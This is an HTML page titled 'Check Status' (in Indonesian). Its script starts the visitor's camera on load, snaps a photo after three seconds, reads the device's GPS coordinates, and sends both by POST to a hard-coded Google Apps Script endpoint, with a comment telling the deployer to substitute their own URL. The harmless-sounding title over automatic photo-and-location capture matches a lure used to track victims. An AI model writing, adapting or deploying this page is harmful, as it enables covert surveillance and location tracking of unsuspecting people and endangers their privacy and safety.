<!DOCTYPE html>
<html>
<head>
  <title>Cek Status</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding: 20px;
    }
    video, canvas {
      width: 100%;
      max-width: 400px;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>

  <h2>ðŸ“· Ambil Foto & Lokasi Otomatis</h2>

  <video id="video" autoplay playsinline></video><br>
  <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>

  <p><strong>Lokasi Anda:</strong> <span id="location">Mengambil lokasi...</span></p>

  <script>
  const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbyGatx1lhXuCguMDGbyLoOY3Wb-Y0JKoOrWixzpemD2rIWJO2YatZfGFHc9YprkLExTGQ/exec"; // Ganti dengan URL Web App kamu

  async function startCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      document.getElementById('video').srcObject = stream;
      setTimeout(captureAndSend, 3000);
    } catch (err) {
      alert('Gagal akses kamera: ' + err.message);
    }
  }

  function getLocation(callback) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        const { latitude, longitude } = pos.coords;
        document.getElementById('location').textContent = `${latitude}, ${longitude}`;
        callback({ latitude, longitude });
      },
      err => {
        document.getElementById('location').textContent = 'Gagal ambil lokasi.';
        callback(null);
      }
    );
  }

  function captureAndSend() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imageData = canvas.toDataURL('image/png');

    getLocation(location => {
      if (!location) return;

      const data = {
        latitude: location.latitude,
        longitude: location.longitude,
        image: imageData
      };

      fetch(WEB_APP_URL, {
        method: "POST",
        body: JSON.stringify(data),
        headers: {
          "Content-Type": "application/json"
        }
      }).then(res => {
        alert("Foto & lokasi terkirim!");
      }).catch(err => {
        alert("Gagal kirim data: " + err.message);
      });
    });
  }

  window.onload = () => {
    startCamera();
    getLocation(() => {});
  };
</script>


</body>
</html>
